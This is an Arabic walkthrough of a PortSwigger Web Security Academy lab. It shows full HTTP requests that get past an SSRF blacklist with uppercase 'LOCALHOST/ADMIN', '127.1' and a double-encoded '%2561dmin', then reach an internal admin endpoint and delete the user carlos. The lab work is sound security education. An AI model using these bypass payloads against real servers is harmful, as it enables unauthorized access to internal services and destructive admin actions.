# [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

## **`الهدف`**
قم بتغيير الـ `URL` الخاص بـ `stock check` للوصول إلى واجهة الإدارة على`http://localhost/admin` ثم قم بحذف حساب `carlos`.
## **`خطوات الحل`**
بعد الدخول إلى اللاب سنتوجه إلى أى منتج ونقوم بالضغط على `Check stock` وبعد ذلك سنجد في الـ `HTTP history` الـطلب التالي فسنقوم بتحويله إلى `Repeater`
```http
POST /product/stock HTTP/2
Host: 0ae500f3035535c48009763000de00a4.web-security-academy.net
Cookie: session=plUytM9alPMiO4iBXxIh7WPaiE1AnBvO

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

ثم سنقوم بتعديل معلم الـ `StocApi` من داخل الـ `Inspector` إلى: `http://localhost/admin` لكن بعدة اشكال مختلفة حتى نجد أنه ينجح معنا إثنين وهما: `http://LOCALHOST/ADMIN` أو بعمل `Double URL Encoding` لحرف الـ `a` ليصبح `%2561`
```http
POST /product/stock HTTP/2
Host: 0ad8008d04079be080361c0f00e60025.web-security-academy.net
Cookie: session=XBZOQ8dImcvopPbvfV7GCiIPg3HxZ22K

stockApi=http%3a%2f%2flocalhost%2fadmin
```
أو
```http
POST /product/stock HTTP/2
Host: 0ae500f3035535c48009763000de00a4.web-security-academy.net
Cookie: session=plUytM9alPMiO4iBXxIh7WPaiE1AnBvO

stockApi=http%3a%2f%2f127.1%2f%2561dmin
```

وبعد إرساله سنجد أن الاستجابة صحيحة وأصبح لدينا وصول للوحة التحكم، وبفحص الاستجابة سنجد أنه لحذف حساب `carlos` يجب أن نقوم بتعديل معلم الـ `StocApi` إلى `http://LOCALHOST/ADMIN/delete?username=carlos` من داخل الـ `Inspector` ونقوم بإرساله
```http
POST /product/stock HTTP/2
Host: 0ad8008d04079be080361c0f00e60025.web-security-academy.net
Cookie: session=XBZOQ8dImcvopPbvfV7GCiIPg3HxZ22K

stockApi=http%3a%2f%2flocalhost%2fadmin%2fdelete%3fusername%3dcarlos
```
وبمجرد إرسال الطلب سنجد أن حساب `carlos` تم حذفه لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [Basic SSRF against the local server](./Basic-SSRF-against-the-local-server.md)
